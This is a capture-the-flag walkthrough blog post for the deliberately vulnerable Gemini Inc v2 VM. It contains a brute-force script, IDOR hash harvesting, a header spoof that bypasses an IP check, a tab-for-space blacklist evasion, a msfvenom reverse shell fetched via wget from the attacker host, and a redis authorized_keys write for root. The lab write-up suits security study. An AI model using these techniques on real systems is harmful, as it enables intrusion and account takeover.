---
layout: post
date: 2018-06-03 17:25:02 +0000
title: "Double Trouble"
category: Walkthrough
tag: "Gemini Inc"
comments: true
image:
  feature: tiger.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/tiger-predator-pair-fur-beautiful-2979932/
---

This post documents the complete walkthrough of Gemini Inc: v2, a boot2root [VM][1] created by [9emin1][2], and hosted [here][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

>**Neo**: Hmmm, upgrades&hellip;

### Information Gathering

Let's kick this off with a `nmap` scan to determine the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 89:d5:38:88:b6:7a:f2:60:29:e7:21:e8:15:ac:14:9b (RSA)
|   256 64:63:77:dc:49:79:0e:b1:4b:62:50:06:9c:33:d5:25 (ECDSA)
|_  256 e4:14:da:a2:a4:33:4b:64:cd:c0:c7:1c:17:b7:cc:fb (ED25519)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome to Gemini Inc v2

```
`nmap` finds 22/tcp and 80/tcp open. Nothing unusual.

### Directory/File Enumeration

Since the site is more secure now, let's take a different approach this time &mdash; fuzzing. The tool for such a job is `wfuzz`. I like `wfuzz` because it's fast, comes with high quality wordlists, and easy-to-use filters for response code, the number of lines, words, and even characters.

```
# wfuzz -w /usr/share/wfuzz/wordlist/general/megabeast.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt --hc 404 -t 50 http://192.168.10.130/FUZZFUZ2Z
...
==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000028:  C=200     17 L	      71 W	   1115 Ch	  "admin - /"
016007:  C=403     38 L	      73 W	   1301 Ch	  "activate - .php"
144002:  C=200      3 L	      40 W	    254 Ch	  "blacklist - .txt"
443875:  C=200     13 L	       0 W	     13 Ch	  "export - .php"
481143:  C=200     89 L	     164 W	   2932 Ch	  "footer - .php"
551675:  C=500      0 L	       0 W	      0 Ch	  "header - .php"
582568:  C=403     11 L	      32 W	    295 Ch	  "icons - /"
600451:  C=200    153 L	     392 W	   5763 Ch	  "index - .php"
690835:  C=200    188 L	     417 W	   7204 Ch	  "login - .php"
710192:  C=200     12 L	      26 W	    626 Ch	  "manual - /"
895543:  C=403      0 L	       0 W	      0 Ch	  "profile - .php"
949891:  C=200    186 L	     415 W	   6844 Ch	  "registration - .php"
1217431: C=403      0 L	       0 W	      0 Ch	  "user - .php"
```

A lot has changed in v2. It exposes files such as `activate.php` and `registration.php`. The file `blacklist.txt` sure is interesting even though I can't make sense of it now.

![0.nn7sk2whrm8](/assets/images/posts/geminiinc-v2-walkthrough/0.nn7sk2whrm8.png)

### User Registration and Activation

It's obvious there's a user registration and activation process. Look at the respective pages in the browser.

![0.fr9jnak27ef](/assets/images/posts/geminiinc-v2-walkthrough/0.fr9jnak27ef.png)

![0.z46xpgzawqe](/assets/images/posts/geminiinc-v2-walkthrough/0.z46xpgzawqe.png)

Let's register an account with the site using everything `admin`. Yes, even the password.

![0.wxincvw3tgq](/assets/images/posts/geminiinc-v2-walkthrough/0.wxincvw3tgq.png)

Although the first attempt results in an error like this, the site has registered the account.

![0.d8b6kznuxu](/assets/images/posts/geminiinc-v2-walkthrough/0.d8b6kznuxu.png)

Once we log in through `/login.php`, a message greets us and tells us that we have to submit a 6-digit code to activate the account.

![0.uawm8innbm](/assets/images/posts/geminiinc-v2-walkthrough/0.uawm8innbm.png)

We'll need the user ID to activate the account. Although the account is not activated at this stage, landing at the hyperlink of the profile page provides us with the user ID.

![0.2u9hulbd8mh](/assets/images/posts/geminiinc-v2-walkthrough/0.2u9hulbd8mh.png)

You can change the user ID in the URL, and because the title gave their usernames away, you can determine the username and user ID of all the users from here.

```
Gemini   (u=1)
demo     (u=8)
demo2    (u=9)
demo3    (u=10)
demo1337 (u=12)
demo4    (u=13)
admin    (u=14)
```

Now that I have the user ID of the newly registered account, let's proceed to activate it. Before we do that, know this &mdash; any invalid code will result in a `403 INVALID VALUE` response from the server.

![0.7qgwlhrfd8u](/assets/images/posts/geminiinc-v2-walkthrough/0.7qgwlhrfd8u.png)

Armed with this information, I wrote `activate.sh`, a simple script to brute-force the activation code.

{% highlight bash linenos %}
#!/bin/bash

HOST=192.168.10.130
ACTIVATE=activate.php
ME=$(basename $0)

function token() {
  local COOKIE=""
  if [ -e cookie ]; then
    COOKIE=" -b cookie"
  else
    COOKIE="-c cookie"
  fi
  curl \
    -s \
    $COOKIE \
    http://$HOST/$1 2>/dev/null \
  | grep -m1 token \
  | cut -d"'" -f6
}

function activate() {
  curl \
    -s \
    -b cookie \
    -w %{http_code} \
    -o /dev/null \
    --data-urlencode "userid=$1" \
    --data-urlencode "activation_code=$2" \
    --data-urlencode "token=$(token $ACTIVATE)" \
    http://$HOST/$ACTIVATE
}

function die() {
  rm -f cookie
  for pid in $(ps aux \
               | grep -v grep \
               | grep "$ME" \
               | awk '{ print $2 }'); do
    kill -9 $pid &>/dev/null
  done
}

# activation
for pin in {000000..999999}; do
  if [ "$(activate $1 $pin $(token $ACTIVATE))" -ne 403 ]; then
    echo "[+] uid: $1, pin: $pin"
    die
  fi
done
{% endhighlight %}

Let's run the script.

```
# ./activate.sh 14
[+] uid: 14, pin: 000511
```

The activation code appears fixed for all new accounts; not that this information is helpful at this point, it's merely a casual observation.

Now that the account is active, the full set of features for an ordinary member is available.

![0.j2aurisrpv](/assets/images/posts/geminiinc-v2-walkthrough/0.j2aurisrpv.png)

I saw the password hash in the HTML source of the profile page during investigation of the unlocked features,

![0.xzv6pwuqt2](/assets/images/posts/geminiinc-v2-walkthrough/0.xzv6pwuqt2.png)

I was able to capture the password hash of all the users by changing the user ID in the URL and viewing the HTML code.

```
Gemini:edbd1887e772e13c251f688a5f10c1ffbb67960d:::::
demo:9848cfbe1f3149dc5461ff1c1f00d854c51a1960:::::
demo2:9848cfbe1f3149dc5461ff1c1f00d854c51a1960:::::
demo3:9848cfbe1f3149dc5461ff1c1f00d854c51a1960:::::
demo1337:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:::::
demo4:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:::::
```

We could add cookies to our browser to gain access to Gemini's account like so:

`user=Gemini;pass=edbd1887e772e13c251f688a5f10c1ffbb67960d`

We could also crack the password hashes offline with John the Ripper, in which case, Gemini's password is `secretpassword`.

### Admin Panel

The **Admin Panel** is in display after I log in to Gemini's account.

![0.0r8oyqawtydk](/assets/images/posts/geminiinc-v2-walkthrough/0.0r8oyqawtydk.png)

Clicking on either **General Settings** or **Execute Command** shows nothing. I look at the HTTP traffic and see a `403 IP NOT ALLOWED` response. Perhaps I need to tell the page that my originating IP address is `127.0.0.1`?

![0.iia4qhz8ici](/assets/images/posts/geminiinc-v2-walkthrough/0.iia4qhz8ici.png)

There's a Burp extension &mdash; **Bypass WAF**, that does the trick. Essentially, the extension adds custom headers such as `X-Forwarded-For: 127.0.0.1` to every HTTP request made through Burp. The instruction to add the extension is beyond the scope of this walkthrough.

Suffice to say, after adding the custom headers, I'm able to display **General Settings** and **Execute Command**.

![0.fn1airridg](/assets/images/posts/geminiinc-v2-walkthrough/0.fn1airridg.png)

![0.zjtyxnja1w](/assets/images/posts/geminiinc-v2-walkthrough/0.zjtyxnja1w.png)

Something strikes me as familiar when I look at the HTML source of the **Execute Command** page at `/new-groups.php`.

![0.747hclxg2ig](/assets/images/posts/geminiinc-v2-walkthrough/0.747hclxg2ig.png)

Recall the file `blacklist.txt` uncovered during fuzzing? It had a test for illegal characters in the `testcmd` parameter. Here we have a readily available webshell that executes commands, yet we have to get pass the test for illegal characters. What a bummer!

![0.y241xdjfa4g](/assets/images/posts/geminiinc-v2-walkthrough/0.y241xdjfa4g.png)

### Execute Command

The most common shell in Linux distributions is `bash` and it uses whitespace as the separator for command execution. For example, in this command `wget -O /tmp/rev 192.168.10.128/rev`, the space character is the separator. In fact, `bash` defines space, tab, and the newline character as whitespace. In other words, we can substitute space with tab in the previous command and it should execute.

With this in mind, let's generate a reverse shell with `msfvenom` and name it as `rev`; host it with Python's `SimpleHTTPServer`, and execute `wget` in the **Execute Command** page to copy it over. The aim would be to execute the reverse shell in the **Execute Command** page.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.10.128 LPORT=4444 -f elf -o rev
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

```
# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.10.130 - - [03/Jun/2018 14:06:42] "GET /rev HTTP/1.1" 200 -
```

![0.eglwibtto8l](/assets/images/posts/geminiinc-v2-walkthrough/0.eglwibtto8l.png)

Yes, we got shell. Let's do one better by copying the RSA public key we control to `/home/gemni1/.ssh/authorized_keys` and logging in with SSH.

![0.o9rv7jkjpn](/assets/images/posts/geminiinc-v2-walkthrough/0.o9rv7jkjpn.png)

There you go.

### Privilege Escalation

During enumeration of `gemini1`'s account, I discover `redis` is running on the host as `root`.

![0.uz31kpsrd4](/assets/images/posts/geminiinc-v2-walkthrough/0.uz31kpsrd4.png)

I need a password to log in to the `redis` server and it's conveniently located in `/etc/redis/6379.conf`.

![0.bty888qayjj](/assets/images/posts/geminiinc-v2-walkthrough/0.bty888qayjj.png)

With the password, I can proceed to abuse `redis` to write files as `root`. We could write the RSA public key we control to `/root/.ssh/authorized_keys` and gain `root` access through SSH.

Here's how.

1. Generate a SSH keypair with `ssh-keygen`.
2. Copy `id_rsa.pub` to `~/.ssh/public.txt`. Pad the top and bottom with two newlines.
3. Set `~/.ssh/public.txt` as a new `redis` value.
4. Configure `dir` as `/root/.ssh/`.
5. Configure `dbfilename` as `authorized_keys`.
6. Save the configuration.
7. Log in with the RSA private key and enjoy your `root` shell.

_Step 1: Generate a SSH keypair with `ssh-keygen`._

```
$ ssh-keygen -t
```

_Step 2: Copy `id_rsa.pub` to `~/.ssh/public.txt`. Pad the top and bottom with two newlines._

```
$ echo -e "\n\n" > .ssh/public.txt
$ cat .ssh/id_rsa.pub >> .ssh/public.txt
$ echo -e "\n\n" >> .ssh/public.txt
```

_Step 3: Set `~/.ssh/public.txt` as a new `redis` value._

```
cat .ssh/public.txt | redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x set pub
```

_Step 4: Configure `dir` as `/root/.ssh/`._

```
$ redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dir "/root/.ssh/"
```

_Step 5: Configure `dbfilename` as `authorized_keys`._

```
redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dbfilename authorized_keys
```

_Step 6: Save the configuration._

```
redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 save
```

_Step 7: Log in with the RSA private key and enjoy your `root` shell._

![0.bwzw8a9z1nd](/assets/images/posts/geminiinc-v2-walkthrough/0.bwzw8a9z1nd.png)

### It Sure Was Fun

![0.cna2uzm6g4d](/assets/images/posts/geminiinc-v2-walkthrough/0.cna2uzm6g4d.png)

:dancer:

[1]: https://www.vulnhub.com/entry/gemini-inc-1,227/
[2]: https://twitter.com/@sec_9emin1
[3]: https://scriptkidd1e.wordpress.com/2018/04/29/gemini-inc-v2-vulnerable-machine/
